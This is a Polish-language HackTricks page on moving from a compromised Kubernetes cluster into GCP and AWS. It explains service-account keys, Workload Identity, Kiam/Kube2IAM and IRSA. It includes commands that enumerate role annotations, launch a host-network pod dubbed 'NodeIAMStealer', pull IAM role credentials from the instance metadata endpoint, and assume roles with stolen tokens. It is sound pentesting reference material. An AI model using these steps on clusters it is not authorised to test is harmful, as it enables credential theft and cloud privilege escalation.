# Kubernetes Przechodzenie do Chmur

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

Jeśli uruchamiasz klaster k8s wewnątrz GCP, prawdopodobnie chcesz, aby niektóre aplikacje uruchomione wewnątrz klastra miały dostęp do GCP. Istnieją 2 powszechne sposoby, aby to osiągnąć:

### Montowanie kluczy GCP-SA jako sekretu

Powszechnym sposobem udzielenia **dostępu aplikacji kubernetes do GCP** jest:

* Utwórz konto usługi GCP
* Przypisz do niego pożądane uprawnienia
* Pobierz klucz json utworzonego SA
* Zamontuj go jako sekret wewnątrz poda
* Ustaw zmienną środowiskową GOOGLE\_APPLICATION\_CREDENTIALS wskazującą ścieżkę, gdzie znajduje się plik json.

{% hint style="warning" %}
Dlatego, jako **atakujący**, jeśli skompromitujesz kontener wewnątrz poda, powinieneś sprawdzić tę **zmienną środowiskową** i **pliki json** z danymi uwierzytelniającymi GCP.
{% endhint %}

### Powiązanie json GSA z sekretem KSA

Sposób udzielenia dostępu GSA do klastra GKE polega na ich powiązaniu w następujący sposób:

* Utwórz konto usługi Kubernetes w tej samej przestrzeni nazw co Twój klaster GKE, używając następującej komendy:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Utwórz tajemnicę Kubernetes, która zawiera dane uwierzytelniające konta usługi GCP, do którego chcesz udzielić dostępu do klastra GKE. Możesz to zrobić za pomocą narzędzia wiersza poleceń `gcloud`, jak pokazano w poniższym przykładzie:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Przypisz tajemnicę Kubernetes do konta usługi Kubernetes za pomocą następującej komendy:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
W **drugim kroku** ustawiono **poświadczenia GSA jako tajemnicę KSA**. Następnie, jeśli możesz **odczytać tę tajemnicę** z **wnętrza** klastra **GKE**, możesz **eskalować do tego konta usługi GCP**.
{% endhint %}

### Tożsamość obciążenia GKE

Dzięki Tożsamości Obciążenia możemy skonfigurować [konto usługi Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) tak, aby działało jako [konto usługi Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Pojemniki uruchamiane z kontem usługi Kubernetes automatycznie uwierzytelniają się jako konto usługi Google podczas dostępu do interfejsów API Google Cloud.

**Pierwsza seria kroków** do włączenia tego zachowania polega na **włączeniu Tożsamości Obciążenia w GCP** ([**kroki**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) i utworzeniu konta GCP SA, które chcesz, aby k8s podawał się za nie.

* **Włącz Tożsamość Obciążenia** w nowym klastrze

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Utwórz/Zaktualizuj nowy nodepool** (Klastry Autopilot nie potrzebują tego) 

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Utwórz **Konto usługi GCP do podrobienia** z K8s z uprawnieniami GCP: 

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Połącz** się z **klastrzem** i **utwórz** konto **usługi** do użycia

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Połącz GSA z KSA** 

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Uruchom **pod** z **KSA** i sprawdź **dostęp** do **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Sprawdź poniższą komendę w celu uwierzytelnienia, jeśli jest to konieczne:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Jako atakujący wewnątrz K8s powinieneś **szukać SAs** z adnotacją **`iam.gke.io/gcp-service-account`**, ponieważ wskazuje to, że SA może uzyskać dostęp do czegoś w GCP. Inną opcją byłoby próbowanie nadużyć każdego KSA w klastrze i sprawdzenie, czy ma dostęp.\
Zawsze interesujące jest wyliczenie powiązań z GCP i zrozumienie, **jakie uprawnienia nadajesz SAs wewnątrz Kubernetes**.
{% endhint %}

To skrypt umożliwia **łatwe iterowanie po definicjach wszystkich** modułów **w poszukiwaniu** tej **adnotacji**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM role for Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Jednym (przestarzałym) sposobem przyznawania ról IAM dla modułów jest użycie [**Kiam**](https://github.com/uswitch/kiam) lub [**Kube2IAM**](https://github.com/jtblin/kube2iam) **serwera**. W zasadzie musisz uruchomić **daemonset** w swoim klastrze z rodzajem uprzywilejowanej roli IAM. Ten daemonset będzie odpowiedzialny za udzielenie dostępu do ról IAM modułom, które go potrzebują.

Po pierwsze musisz skonfigurować **które role mogą być dostępne wewnątrz przestrzeni nazw**, i robisz to za pomocą adnotacji w obiekcie przestrzeni nazw:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Gdy przestrzeń nazw jest skonfigurowana z rolami IAM, **możesz wskazać rolę, którą chcesz przypisać do każdej definicji poda za pomocą czegoś w rodzaju**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Jako atakujący, jeśli **znajdziesz te adnotacje** w podach lub przestrzeniach nazw lub uruchomionym serwerze kiam/kube2iam (prawdopodobnie w kube-system), możesz **podawać się za każdą r**olę, która jest już **używana przez pod**y i więcej (jeśli masz dostęp do konta AWS, wylicz role).
{% endhint %}

#### Utwórz Pod z rolą IAM

{% hint style="info" %}
Rola IAM, którą należy wskazać, musi znajdować się w tym samym koncie AWS co rola kiam/kube2iam i ta rola musi mieć do niej dostęp.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### Rola IAM dla kont usług K8s za pomocą OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Jest to **zalecany sposób przez AWS**.

1. Po pierwsze musisz [utworzyć dostawcę OIDC dla klastra](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Następnie tworzysz rolę IAM z uprawnieniami, których będzie wymagał SA.
3. Utwórz [relację zaufania między rolą IAM a SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nazwą (lub przestrzeniami nazw, które umożliwiają dostęp do roli wszystkim SA w przestrzeni nazw). _Relacja zaufania będzie głównie sprawdzać nazwę dostawcy OIDC, nazwę przestrzeni nazw i nazwę SA_.
4. Wreszcie, **utwórz SA z adnotacją wskazującą ARN roli**, a pody działające z tym SA będą miały **dostęp do tokenu roli**. **Token** jest **zapisany** w pliku, a ścieżka jest określona w **`AWS_WEB_IDENTITY_TOKEN_FILE`** (domyślnie: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Aby **uzyskać dostęp do aws za pomocą tokena** z `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, uruchom:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Jako atakujący, jeśli możesz wyliczyć klaster K8s, sprawdź **konta usług z tą adnotacją**, aby **eskalować do AWS**. Aby to zrobić, po prostu **wykonaj/utwórz** pod używając jednego z **uprzywilejowanych kont usług IAM** i skradnij token.

Co więcej, jeśli jesteś wewnątrz poda, sprawdź zmienne środowiskowe takie jak **AWS\_ROLE\_ARN** i **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Czasami **Polityka Zaufania roli** może być **źle skonfigurowana** i zamiast udzielać dostępu AssumeRole oczekiwanemu kontu usługi, udziela go **wszystkim kontom usług**. Dlatego jeśli jesteś w stanie napisać adnotację na kontrolowanym koncie usługi, możesz uzyskać dostęp do roli.

Sprawdź **następną stronę po więcej informacji**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Znajdź Pody i Konta Usług z Rolami IAM w Klasterze

To jest skrypt do łatwego **iterowania po wszystkich podach i definicjach kont usług** szukając tej **adnotacji**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Rola IAM węzła

Poprzedni rozdział dotyczył sposobów kradzieży ról IAM za pomocą kubków, ale zauważ, że **Węzeł** klastra K8s będzie **instancją w chmurze**. Oznacza to, że Węzeł prawdopodobnie będzie miał nową rolę IAM, którą można ukraść (_zauważ, że zazwyczaj wszystkie węzły klastra K8s będą miały tę samą rolę IAM, więc może nie warto sprawdzać każdego węzła_).

Jednak istnieje ważne wymaganie dotyczące dostępu do punktu końcowego metadanych z węzła, musisz być na węźle (sesja ssh?) lub przynajmniej mieć tę samą sieć:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Skradnij token roli IAM

Wcześniej omówiliśmy, jak **dołączyć role IAM do modułów** lub nawet jak **uciec do węzła, aby ukraść rolę IAM**, którą instancja ma dołączoną do siebie.

Możesz użyć poniższego skryptu, aby **ukraść** nowo zdobyte **poświadczenia roli IAM**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Odnośniki

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Ucz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
